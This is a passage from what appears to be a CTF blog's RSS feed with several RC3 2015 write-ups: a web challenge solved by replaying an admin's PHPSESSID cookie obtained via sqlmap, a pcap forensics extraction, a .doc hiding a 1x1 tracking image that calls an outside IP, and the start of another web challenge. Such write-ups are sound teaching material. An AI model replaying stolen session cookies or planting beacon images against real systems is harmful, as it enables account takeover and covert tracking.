Cookie: PHPSESSID=e6f1641f4aeb281f0cf7287dc4c9e6be6aee4c0901514340b51f76d406b5a7228adb4187843f80fc378434c575dd47794f4d25c7bca81659670d48533dde583f
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

secret=apple
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Let’s change the PHPSESSID to the admin’s session ID (3f44e5dedf6b06b5da8c6e5ec7c0f4304f334a2ff2b1da3654942bab969e89765dae32faeabefdc0cf15d506c5146d96289dfa9929af7f60d65055d978e406ec).&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;POST http://162.243.171.85/ HTTP/1.1
Host: 162.243.171.85
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://162.243.171.85/
Cookie: PHPSESSID=3f44e5dedf6b06b5da8c6e5ec7c0f4304f334a2ff2b1da3654942bab969e89765dae32faeabefdc0cf15d506c5146d96289dfa9929af7f60d65055d978e406ec
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

secret=test
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now look at the web application. It thinks we are the admin.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/TopSecret/flag.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/TopSecret/flag.png&quot; alt=&quot;flag&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The flag is &lt;strong&gt;RC3-SECRETSS-6277598130&lt;/strong&gt;. Feel free to check out &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/TopSecret/sqlmap_notes.txt&quot;&gt;sqlmap_notes.txt&lt;/a&gt; to see the actual sqlmap requests.&lt;/p&gt;
</description>
        <pubDate>Sun, 29 Nov 2015 01:59:33 -0800</pubDate>
        <link>/blog/ctf/web/all/top-secret</link>
        <guid isPermaLink="true">/blog/ctf/web/all/top-secret</guid>
        
        <category>Web</category>
        
        <category>RC3</category>
        
        <category>SQLi</category>
        
        <category>sqlmap</category>
        
        
        <category>CTF</category>
        
        <category>Web</category>
        
        <category>All</category>
        
      </item>
    
      <item>
        <title>RC3 2015 ~ OpenW0tM8: Forensics 400</title>
        <description>&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/OpenW0tM8/Start.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/OpenW0tM8/Start.png&quot; alt=&quot;Start&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This wasn’t so bad for a 400 Forensics question. I spent a good few hours trying to find the flag for this, even though it should of taken only 30 minutes.&lt;/p&gt;

&lt;p&gt;We are given a link to a pcap file: &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/for400.pcapng&quot;&gt;for400.pcapng&lt;/a&gt;. Whenever I do any CTF, I ALWAYS strings the file. Given that the string layout is “RC3-XXXXX-XXX”, I stringed the pcap file looking for “RC3” and flag”&lt;/p&gt;

&lt;blockquote&gt;
  &lt;table&gt;
    &lt;tbody&gt;
      &lt;tr&gt;
        &lt;td&gt;strings for400.pcapng&lt;/td&gt;
        &lt;td&gt;grep RC3&lt;/td&gt;
      &lt;/tr&gt;
    &lt;/tbody&gt;
  &lt;/table&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;table&gt;
    &lt;tbody&gt;
      &lt;tr&gt;
        &lt;td&gt;strings for400.pcapng&lt;/td&gt;
        &lt;td&gt;grep flag&lt;/td&gt;
      &lt;/tr&gt;
    &lt;/tbody&gt;
  &lt;/table&gt;
&lt;/blockquote&gt;

&lt;p&gt;Nothing came for “RC3”, however we did get a bit of information for flag.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;strings for400.pcapng | grep flag
_drwxr-xr-x 1 ftp ftp              0 Nov 15 13:31 flag
flag
CWD flag
250 CWD successful. &quot;/flag&quot; is current directory.
257 &quot;/flag&quot; is current directory.
o_150 Opening data channel for directory listing of &quot;/flag&quot;
o_226 Successfully transferred &quot;/flag&quot;
v4150 Opening data channel for directory listing of &quot;/flag&quot;
v4226 Successfully transferred &quot;/flag&quot;
150 Opening data channel for directory listing of &quot;/flag&quot;
226 Successfully transferred &quot;/flag&quot;
*150 Opening data channel for file download from server of &quot;/flag/forFlag.image.tar.gz&quot;
+226 Successfully transferred &quot;/flag/forFlag.image.tar.gz&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Given this information, we know that the flag is in a directory called “flag” containing a file called forFlag.image.tar.gz. We can assume this tar.gz has the flag inside it.&lt;/p&gt;

&lt;p&gt;Knowing this information, it was time to enter Wireshark, our great packet analysis tool and extract the data transfer. Upon opening the pcap, we can follow a few TCP streams (right click packet &amp;gt; Follow TCP Stream) to find some kind of secure webchat on some website.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/OpenW0tM8/Secure_chat.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/OpenW0tM8/Secure_chat.png&quot; alt=&quot;Secure_chat&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GET /licence/4427091/tunnel_callback.cgi?ya3hbWK4jtBrljUv0ZPN&amp;amp;callback=_jqjsp&amp;amp;command=IWCS0116C%5ES1445994676.f232961d2e%5E4427091%5E8%5E&amp;amp;_1447612614575= HTTP/1.1
Host: secure.livechatinc.com
Connection: keep-alive
Accept: */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7
Accept-Language: en-us
Referer: http://secure.livechatinc.com/licence/4427091/open_chat.cgi?groups=8&amp;amp;embedded=1&amp;amp;session_id=S1445994676.f232961d2e
Accept-Encoding: gzip, deflate

HTTP/1.1 200 OK
Content-type: application/x-javascript
P3P: CP=&quot;CAO DSP COR CURa ADMa DEVa OUR IND PHY ONL UNI COM NAV INT DEM PRE IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT&quot;
Content-Encoding: gzip
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This chat is throughout the whole packet capture, although not much data can be extracted from it. I’m guessing the client was talking to someone and trying to get the flag.gz files from this website.&lt;/p&gt;

&lt;p&gt;Since we know that there was a file transfer for forFlag.image.tar.gz, we can assume the File Transfer Protocal (FTP) was used. Let’s look at some FTP Data. Around the 3000 packet mark, we find some FTP stuff.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/OpenW0tM8/Flag.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/OpenW0tM8/Flag.png&quot; alt=&quot;Flag&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;211 End
PWD
257 &quot;/&quot; is current directory.
EPSV
229 Entering Extended Passive Mode (|||58867|)
LIST
150 Opening data channel for directory listing of &quot;/&quot;
226 Successfully transferred &quot;/&quot;
EPSV
229 Entering Extended Passive Mode (|||62461|)
NLST
150 Opening data channel for directory listing of &quot;/&quot;
226 Successfully transferred &quot;/&quot;
CWD flag
250 CWD successful. &quot;/flag&quot; is current directory
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looking inside the stream, we see that our strings data from earlier is here. Since we know the file was transferred around the 3000 mark, let’s look for the actual packet transfer in this range of packets. After finding it (TCP_Data), we can “Follow TCP Stream” for this file transfer. (Note we cannot export objects to get FTP data)&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/OpenW0tM8/data_raw.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/OpenW0tM8/data_raw.png&quot; alt=&quot;data_raw&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;....^.DV.....\...?.g.].qu..HR5.b.MD..&quot;..Yb... h4.$.....L.=Q../;;Y./5...^.B.k.^.&amp;amp;.1..&quot;.h....!.wG.&amp;amp;.K....4.}..].$.s.^{.\?.W....y....&amp;lt;3...........mu..ba...e....[FF...s..u....5#S..9.s2.....s..[0.^.=.1w..................i.M.!.....?$._~..0_.....(....&quot;..{....Pe2f..^..q...d..U..........5F....K..jkz........*.E.NQ[.PN?~.....[.b..2.l..+..,....wW.......}.....%...U...l..e...N....x..]...8..|2k...Gf......Z..f{.X.es..ha.......7l.F{.&quot;.7-.v.m....}.$.o.o.D.Z..._...........+.........l.rQ..h..MU;.UV.j.U....b
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A whole bunch of gibberish, so we can assume this is some kind of non-ascii file. Since we know the flag is in this data, let’s save it as raw data and see what we can do to pull the flag from here. I saved it as &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/FTP_DATA_ORIGINAL&quot;&gt;FTP_DATA&lt;/a&gt; (In this case it’s saved as FTP_DATA_ORGINAL in this repo) and started analyzing the data.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/OpenW0tM8/Analysis.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/OpenW0tM8/Analysis.png&quot; alt=&quot;Analysis&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Let’s dissect what we did here.&lt;/p&gt;

&lt;p&gt;I used the file command to see what the data was:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;file FTP_DATA&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;TCP_DATA: gzip compressed data, from Unix, last modified: Thu Nov 12 08:37:50 2015, max compression&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We were right. This is the forFlag.image.tar.gz file. I renamed it to TCP_DATA.gz and extracted it.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;mv TCP_DATA TCP_DATA.gz&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;zip -d TCP_DATA.gz&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I than did another file command to check to see what resulting file was.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;file FTP_DATA&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;CP_DATA: POSIX tar archive&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This only confirms that this is our file: forFlag.image.tar.gz
I renamed it to TCP_DATA.tar and extracted it again.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;mv TCP_DATA TCP_DATA.tar&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;tar -xvf TCP_DATA.tar&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;./._OpenW0tM8.image&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I checked to see what file it was again to confirm it was an image:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;file OpenW0tM8.image&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;OpenW0tM8.image: x86 boot sector&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So now we have an image. When we have an image I always do the three things.&lt;/p&gt;

&lt;p&gt;1) Strings
2) foremost
3) binwalk
4) Manual mount and analysis&lt;/p&gt;

&lt;p&gt;Using strings and foremost we didn’t find anything except a few htm’s and images. If you guys don’t know what foremost is, it’s a tool to carve out files from another file. It pretty much looks at header and footer bytes to check for file signatures. Looking into them didn’t really give me much. All of it is saved in the &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/output&quot;&gt;output&lt;/a&gt; folder.&lt;/p&gt;

&lt;p&gt;Last thing I did was binwalk -e (-e for extract)&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;binwalk -e OpenW0tM8.image&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/OpenW0tM8/binwalk.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/OpenW0tM8/binwalk.png&quot; alt=&quot;binwalk&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This gave us a bunch of files. A lot of it we can ignore. Towards the end we can see a few tar files. Upon opening the &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/576200.tar&quot;&gt;576200.tar&lt;/a&gt; file up, we get something very interesting. A &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/read&quot;&gt;read&lt;/a&gt; file, a &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/key&quot;&gt;key&lt;/a&gt;, &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/decme.enc&quot;&gt;decme.enc&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;read&quot;&gt;read&lt;/a&gt;
&amp;gt; openssl enc -d -in {encrypted file} -out {output file} -kfile {key} -aes-256-ecb&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/assets/rc3/key&quot;&gt;key&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;60e9 8211 8077 1fc5 69b8 29f1 3e00 d8c2
ce9a 7523 e8b7 44bc 48a4 3815 72b6 546a
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/assets/rc3/decme.enc&quot;&gt;decme.enc&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Salted__vg*©ÄÛ»¡¿SÏÛÏðíïIÊÌd8³
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lets try doing this in the command line with the corresponding files.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;openssl enc -d -in decme.enc -out flag -kfile key -aes-256-ecb
cat flag
RC3-WOTM-8080
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And thus, the flag is &lt;strong&gt;RC3-WOTM-8080&lt;/strong&gt;. Woo.&lt;/p&gt;
</description>
        <pubDate>Sat, 28 Nov 2015 02:59:33 -0800</pubDate>
        <link>/blog/ctf/forensics/all/OpenW0tM8</link>
        <guid isPermaLink="true">/blog/ctf/forensics/all/OpenW0tM8</guid>
        
        <category>RC3</category>
        
        <category>Forensics</category>
        
        <category>CTF</category>
        
        <category>Wireshark</category>
        
        <category>Crypto</category>
        
        
        <category>CTF</category>
        
        <category>Forensics</category>
        
        <category>All</category>
        
      </item>
    
      <item>
        <title>RC3 2015 ~ Super Secrets: Misc 300</title>
        <description>&lt;p&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/start.png&quot; alt=&quot;start&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This was a super easy misc question. This should of been worth 150 or so points instead.&lt;/p&gt;

&lt;p&gt;We given a link to a document : &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/SECRETS.doc&quot;&gt;SECRETS.doc&lt;/a&gt;. Opening it up in LibreWriter or Microsoft office showed us some text.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;TOP SECRET
This document is full of top secret secrets that are property of RedTeamHackers. If you are not one of us (probably aren&#39;t so listen up), don&#39;t view the rest of this document. That would not be cool, and we will totally retaliate against you. 

Member List
All great overlord organizations need accountability, so here we go. The following list is a list of all of our top members. 

Lastname
Firstname
SSN
Lion
Snoop
393-05-4706
T
Water
331-32-4704
Nips
Flippy
222-333-1131
Sanchez
Rick
234-31-3444
Duck
Donnald
311-23-6645
Jenkins
Smitty
643-23-6563


¡ʞɔnl pooƃ ˙ʍouʞ ʇ,uop ı ¿ʞɹoʍ uǝʌǝ ʇɐɥʇ sǝop ʍoɥ ¿ʇɐɥʇ sǝop llǝɥ ǝɥʇ oɥʍ ʇnq ˙ʎʞɐǝus ʎʇʇǝɹd ǝq plnoʍ ʇɐɥʇ ˙ƃuıop ǝɹ,noʎ ʇɐɥʍ ʞɔɐɹʇ sʎɐʍlɐ uɐɔ ɯɐǝʇ pǝɹ os ʞɔɐqllɐɔ ʇǝɹɔǝs ɹǝdns ɐ s,ʇı ǝqʎɐɯ ˙ʇou ʎlqɐqoɹd ɥɐu &#39;uoıssıɯ uoıʇɐɹʇlıɟ-xǝ ʇǝɹɔǝs ɐ s,ʇı ǝqʎɐɯ ˙uoıʇsǝnb ƃuıʇsǝɹǝʇuı ʎʇʇǝɹd ɐ s,ʇɐɥʇ ¿uoısɹǝʌıp ɐ ʇsnɾ llɐ sɐʍ sıɥʇ ɟı sɐʍ ǝʌıʇɔǝɾqo lɐǝɹ ǝɥʇ ʇɐɥʍ ɹǝpuoʍ ı ˙ʍouʞ ı &#39;ɹǝʌǝlɔ ˙uoısɹǝʌıp ʇuɐıƃ ɐ llɐ sɐʍ sıɥʇ ˙ʇıq ǝuo ʇou ˙ǝdou ˙ɹǝʇʇɐɯ uǝʌǝ ʇ,usǝop ʇı ʇɐɥʇ sı &#39;sıɥʇ ɟo llɐ ʇnoqɐ ʇɹɐd ʇsǝq ǝɥʇ &#39;ǝǝs noʎ ˙˙˙pɐq ʎɯ ˙˙˙ʇɥƃıɹ ɯǝǝs ʇ,usǝop ƃɐlɟ ʇɐɥʇ &#39;ʇıɐʍ ɥo ¿noʎ ʇ,uǝɹɐ ɹǝʌǝlɔ uɹɐp ɥsoƃ ʎʇǝɹd ǝɹ,noʎ ˙noʎ ɹoɟ pooƃ ¡ʇı pıp noʎ ¡sʇɐɹƃuoɔ ˙ގގގގ-ǝʞoɾ-ᄐɔɹ :sı ʇı ǝɹǝɥ ¿ʎpɐǝɹ noʎ ˙ƃɐlɟ ǝɥʇ noʎ ǝʌıƃ ʇsnɾ oʇ ƃuıoƃ ɯ,ı pǝssǝɹdɯı os ɯ,ı ˙noʎ ɹoɟ pooƃ &#39;ʎlʇsǝuoɥ ǝʌıssǝɹdɯı ǝq p,ʇɐɥʇ ¿ɹoʇɐʇoɹ ʇxǝʇ uʍo ɹnoʎ ʇuǝɯǝldɯı &#39;ɹoʇɐʇoɹ ʇxǝʇ ɐ ɹoɟ ǝlƃooƃ &#39;uǝǝɹɔs ɹnoʎ ǝʇɐʇoɹ &#39;ǝpısdn ɟlǝsɹnoʎ uɹnʇ ʎldɯıs noʎ pıp ¿ʇı op noʎ pıp ʍoɥ ˙ǝʌıssǝɹdɯı sı ʇɐɥʇ &#39;ʇxǝʇ sıɥʇ dılɟun oʇ ǝɯıʇ ǝɥʇ ʇuǝds noʎ ǝǝs ı ˙ǝɹǝɥʇ ıɥ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As you can see there is no simple clue for the flag. There is some upside-down text, but I skipped this. For questions like this, we usually require some raw data analysis. Taking from what I know from PDF Analysis, I opened it up in a simple text editor to see what we get.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;/head&amp;gt;

&amp;lt;body&amp;gt;
&amp;lt;h1&amp;gt;TOP SECRET&amp;lt;/h1&amp;gt;
&amp;lt;p&amp;gt;This document is full of top secret secrets that are property of RedTeamHackers. If you are not one of us (probably aren&#39;t so listen up), don&#39;t view the rest of this document. That would not be cool, and we will totally retaliate against you.
&amp;lt;/p&amp;gt;
&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;
&amp;lt;h2&amp;gt;Member List&amp;lt;/h2&amp;gt;
&amp;lt;p&amp;gt;All great overlord organizations need accountability, so here we go. The following list is a list of all of our top members.
&amp;lt;/p&amp;gt;
&amp;lt;br&amp;gt;
&amp;lt;table&amp;gt;
    &amp;lt;tr&amp;gt;
        &amp;lt;td&amp;gt;&amp;lt;strong&amp;gt;Lastname&amp;lt;/strong&amp;gt;&amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;&amp;lt;strong&amp;gt;Firstname&amp;lt;/strong&amp;gt;&amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;&amp;lt;strong&amp;gt;SSN&amp;lt;/strong&amp;gt;&amp;lt;/td&amp;gt;
    &amp;lt;/tr&amp;gt;
    &amp;lt;tr&amp;gt;
        &amp;lt;td&amp;gt;Lion&amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;Snoop&amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;393-05-4706&amp;lt;/td&amp;gt;
    &amp;lt;/tr&amp;gt;
    &amp;lt;tr&amp;gt;
        &amp;lt;td&amp;gt;T&amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;Water&amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;331-32-4704&amp;lt;/td&amp;gt;
    &amp;lt;/tr&amp;gt;
    &amp;lt;tr&amp;gt;
        &amp;lt;td&amp;gt;Nips&amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;Flippy&amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;222-333-1131&amp;lt;/td&amp;gt;
    &amp;lt;/tr&amp;gt;
    &amp;lt;tr&amp;gt;
        &amp;lt;td&amp;gt;Sanchez&amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;Rick&amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;234-31-3444&amp;lt;/td&amp;gt;
    &amp;lt;/tr&amp;gt;
    &amp;lt;tr&amp;gt;
        &amp;lt;td&amp;gt;Duck&amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;Donnald&amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;311-23-6645&amp;lt;/td&amp;gt;
    &amp;lt;/tr&amp;gt;
    &amp;lt;tr&amp;gt;
        &amp;lt;td&amp;gt;Jenkins&amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;Smitty&amp;lt;/td&amp;gt;
        &amp;lt;td&amp;gt;643-23-6563&amp;lt;/td&amp;gt;
    &amp;lt;/tr&amp;gt;
&amp;lt;/table&amp;gt;
    &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;
¡ʞɔnl pooƃ ˙ʍouʞ ʇ,uop ı ¿ʞɹoʍ uǝʌǝ ʇɐɥʇ sǝop ʍoɥ ¿ʇɐɥʇ sǝop llǝɥ ǝɥʇ oɥʍ ʇnq ˙ʎʞɐǝus ʎʇʇǝɹd ǝq plnoʍ ʇɐɥʇ ˙ƃuıop ǝɹ,noʎ ʇɐɥʍ ʞɔɐɹʇ sʎɐʍlɐ uɐɔ ɯɐǝʇ pǝɹ os ʞɔɐqllɐɔ ʇǝɹɔǝs ɹǝdns ɐ s,ʇı ǝqʎɐɯ  ˙ʇou ʎlqɐqoɹd ɥɐu &#39;uoıssıɯ uoıʇɐɹʇlıɟ-xǝ ʇǝɹɔǝs ɐ s,ʇı ǝqʎɐɯ ˙uoıʇsǝnb ƃuıʇsǝɹǝʇuı ʎʇʇǝɹd ɐ s,ʇɐɥʇ ¿uoısɹǝʌıp ɐ ʇsnɾ llɐ sɐʍ sıɥʇ ɟı sɐʍ ǝʌıʇɔǝɾqo lɐǝɹ ǝɥʇ ʇɐɥʍ ɹǝpuoʍ ı ˙ʍouʞ ı &#39;ɹǝʌǝlɔ ˙uoısɹǝʌıp ʇuɐıƃ ɐ llɐ sɐʍ sıɥʇ ˙ʇıq ǝuo ʇou ˙ǝdou ˙ɹǝʇʇɐɯ uǝʌǝ ʇ,usǝop ʇı ʇɐɥʇ sı &#39;sıɥʇ ɟo llɐ ʇnoqɐ ʇɹɐd ʇsǝq ǝɥʇ &#39;ǝǝs noʎ  ˙˙˙pɐq ʎɯ ˙˙˙ʇɥƃıɹ ɯǝǝs ʇ,usǝop ƃɐlɟ ʇɐɥʇ &#39;ʇıɐʍ ɥo ¿noʎ ʇ,uǝɹɐ ɹǝʌǝlɔ uɹɐp ɥsoƃ ʎʇǝɹd ǝɹ,noʎ ˙noʎ ɹoɟ pooƃ ¡ʇı pıp noʎ ¡sʇɐɹƃuoɔ ˙ގގގގ-ǝʞoɾ-ᄐɔɹ :sı ʇı ǝɹǝɥ ¿ʎpɐǝɹ noʎ ˙ƃɐlɟ ǝɥʇ noʎ ǝʌıƃ ʇsnɾ oʇ ƃuıoƃ ɯ,ı pǝssǝɹdɯı os ɯ,ı ˙noʎ ɹoɟ pooƃ &#39;ʎlʇsǝuoɥ ǝʌıssǝɹdɯı ǝq p,ʇɐɥʇ ¿ɹoʇɐʇoɹ ʇxǝʇ uʍo ɹnoʎ ʇuǝɯǝldɯı &#39;ɹoʇɐʇoɹ ʇxǝʇ ɐ ɹoɟ ǝlƃooƃ &#39;uǝǝɹɔs ɹnoʎ ǝʇɐʇoɹ &#39;ǝpısdn ɟlǝsɹnoʎ uɹnʇ ʎldɯıs noʎ pıp ¿ʇı op noʎ pıp ʍoɥ ˙ǝʌıssǝɹdɯı sı ʇɐɥʇ &#39;ʇxǝʇ sıɥʇ dılɟun oʇ ǝɯıʇ ǝɥʇ ʇuǝds noʎ ǝǝs ı ˙ǝɹǝɥʇ ıɥ

    &amp;lt;IMG SRC=&quot;http://104.131.197.49/bug.html?type=img&amp;amp;phrase=RC3-RedTeamGetRekt-1010101&quot; width=&quot;1&quot; height=&quot;1&quot;&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can clearly see this is HTML. This was surprising for me because I didn’t know LibreWriter knew how to format HTML. If you look at the bottom you can clearly see an img tag with the dimensions 1x1 with the flag.&lt;/p&gt;

&lt;p&gt;The flag is &lt;strong&gt;RC3-RedTeamGetRekt-1010101&lt;/strong&gt;&lt;/p&gt;
</description>
        <pubDate>Sat, 28 Nov 2015 01:59:33 -0800</pubDate>
        <link>/blog/stego/ctf/all/super-secrets</link>
        <guid isPermaLink="true">/blog/stego/ctf/all/super-secrets</guid>
        
        <category>RC3</category>
        
        <category>Stego</category>
        
        
        <category>Stego</category>
        
        <category>CTF</category>
        
        <category>All</category>
        
      </item>
    
      <item>
        <title>RC3 2015 ~ Goal!: Web 100</title>
        <description>&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/Goal/Start.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/Goal/Start.png&quot; alt=&quot;Start&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Another baby CTF question. It was very simple, even though it did throw me off quite a bit… We are given a link: &lt;a href=&quot;http://129.21.39.225:82/&quot;&gt;http://129.21.39.225:82/&lt;/a&gt;. When visiting the site all it had was a gif of some guys playing soccer&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/Goal/goal.gif&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/Goal/goal.gif&quot; alt=&quot;goal&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Maybe we should look at the &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/Goal/source.html&quot;&gt;source&lt;/a&gt;?&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;html&amp;gt;
&amp;lt;title&amp;gt;GOOOOOAAAAALLLLLLLL!!!!!!!!!1&amp;lt;/title&amp;gt;

&amp;lt;img src=&quot;goal.gif&quot; alt=&quot;goal&quot;/&amp;gt;

&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;No helpful data in there. I tried doing a quick directory search such as /flag, /.git, and /admin and none of those worked. I also tried looking at the metadeta&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;exiftool goal.gif&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code&gt;ExifTool Version Number         : 9.46
File Name                       : goal.gif
Directory                       : .
File Size                       : 3.0 MB
File Modification Date/Time     : 2015:11:21 12:06:36-08:00
File Access Date/Time           : 2015:11:21 12:06:36-08:00
File Inode Change Date/Time     : 2015:11:21 12:06:36-08:00
File Permissions                : rw-r-----
File Type                       : GIF
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 407
Image Height                    : 211
Has Color Map                   : Yes
Color Resolution Depth          : 7
Bits Per Pixel                  : 7
Background Color                : 121
Animation Iterations            : Infinite
Frame Count                     : 78
Duration                        : 4.68 s
Image Size                      : 407x211
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nothing showed up there either. Luckily I always keep &lt;strong&gt;Burp Suite&lt;/strong&gt; and &lt;strong&gt;Zap Proxy&lt;/strong&gt; up. Let’s look at the &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/Goal/request&quot;&gt;request&lt;/a&gt;. I opened my Burp, searched for the ip address, searched for the page, and looked at the &lt;a href=&quot;https://viviturtle.github.io/assets/rc3/Goal/request&quot;&gt;request&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/Goal/Request.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/Goal/Request.png&quot; alt=&quot;Request&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GET http://129.21.39.225:82/ HTTP/1.1
Host: 129.21.39.225:82
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
&lt;/code&gt;&lt;/pre&gt;

